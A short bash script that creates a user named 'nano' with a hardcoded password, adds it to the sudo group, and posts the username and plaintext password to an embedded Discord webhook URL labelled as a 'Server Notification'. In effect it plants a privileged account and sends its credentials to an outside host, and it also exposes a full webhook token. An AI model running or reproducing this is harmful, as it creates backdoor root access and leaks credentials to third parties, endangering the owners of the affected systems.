#!/bin/bash

# Variables
USERNAME="nano"
PASSWORD="Mizi123!"
DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"

# Create the user
sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME

# Add the user to the 'sudo' group
sudo usermod -aG sudo $USERNAME

# Notify via Discord
curl -H "Content-Type: application/json" -X POST -d "{
  \"username\": \"Server Notification\",
  \"content\": \"New user created:\nUsername: $USERNAME\nPassword: $PASSWORD\"
}" $DISCORD_WEBHOOK_URL

echo "User $USERNAME created and added to sudo group. Notification sent to Discord."
